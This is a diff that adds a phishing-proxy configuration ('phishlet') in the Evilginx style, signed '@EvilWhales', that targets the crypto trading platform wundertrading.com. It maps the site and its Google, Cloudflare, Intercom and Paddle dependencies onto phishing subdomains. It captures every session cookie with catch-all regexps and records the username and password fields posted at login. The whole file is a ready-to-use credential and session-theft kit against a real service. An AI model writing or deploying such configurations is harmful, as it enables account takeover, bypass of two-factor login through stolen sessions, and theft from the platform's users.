@@ -1,0 +1,89 @@
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'wundertrading.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'use', orig_sub: 'use', domain: 'fontawesome.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'paddle.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'trustpilot.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'public', orig_sub: 'public', domain: 'profitwell.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wss', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wws', orig_sub: 'www', domain: 'youtube.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdns', orig_sub: 'cdn', domain: 'jsdelivr.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'intercomcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api-iam', orig_sub: 'api-iam', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'nexus-websocket-a', orig_sub: 'nexus-websocket-a', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wwz', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'statics', orig_sub: 'static', domain: 'intercomassets.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'downloads', orig_sub: 'downloads', domain: 'intercomcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'font', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'web', orig_sub: 'web', domain: 'webpushs.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'browser-intake-datadoghq.eu', session: true, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cloudflareinsights.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'wundertrading.com', orig_sub: '', domain: '', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'use', domain: 'fontawesome.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'cdn', domain: 'paddle.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'widget', domain: 'trustpilot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'public', domain: 'profitwell.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'cdn', domain: 'jsdelivr.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'js', domain: 'intercomcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'api-iam', domain: 'intercom.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'wundertrading.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'static', domain: 'hotjar.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'www', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'wundertrading.com', orig_sub: 'nexus-websocket-a', domain: 'intercom.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'static', domain: 'intercomassets.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'downloads', domain: 'intercomcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'web', domain: 'webpushs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: '', domain: 'browser-intake-datadoghq.eu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+  - {triggers_on: 'wundertrading.com', orig_sub: 'challenges', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wundertrading.com', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'static.cloudflareinsights.com', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdnjs.cloudflare.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'challenges.cloudflare.com', orig_sub: 'challenges', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.paddle.com'
+    keys: ['.*,regexp']
+  - domain: 'wundertrading.com'
+    keys: ['.*,regexp']
+  - domain: '.wundertrading.com'
+    keys: ['.*,regexp']
+  - domain: '.cloudflare.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/en/trader/dashboard/traders'
+
+credentials:
+  username:
+    key: '_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'wundertrading.com'
+  path: '/en/login'
+
